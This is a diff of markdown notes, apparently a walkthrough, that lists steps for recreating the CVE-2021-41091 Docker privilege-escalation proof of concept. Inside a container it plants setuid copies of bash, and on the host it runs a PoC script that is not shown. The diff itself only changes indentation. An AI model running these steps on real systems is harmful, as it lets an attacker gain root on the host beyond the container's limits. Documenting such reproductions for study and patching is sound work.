@@ -10,11 +10,12 @@
 `$ install -m =xs $(which bash) .`      
 `$ /bin/bash -p`
 7. recreate the `CVE-2021-41091` PoC  
+
     **inside the docker container:**    
-    - `$ install -m =xs $(which bash) .`
-    - `$ /bin/bash -p`
-    - `$ chmod u+s /bin/bash`
-    - `$ /bin/bash`  
+        - `$ install -m =xs $(which bash) .`  
+        - `$ /bin/bash -p`  
+        - `$ chmod u+s /bin/bash`  
+        - `$ /bin/bash`  
     **then at the host machine:**    
-    - copy the PoC script
-    - run and follow the script instruction 
+        - copy the PoC script  
+        - run and follow the script instruction   
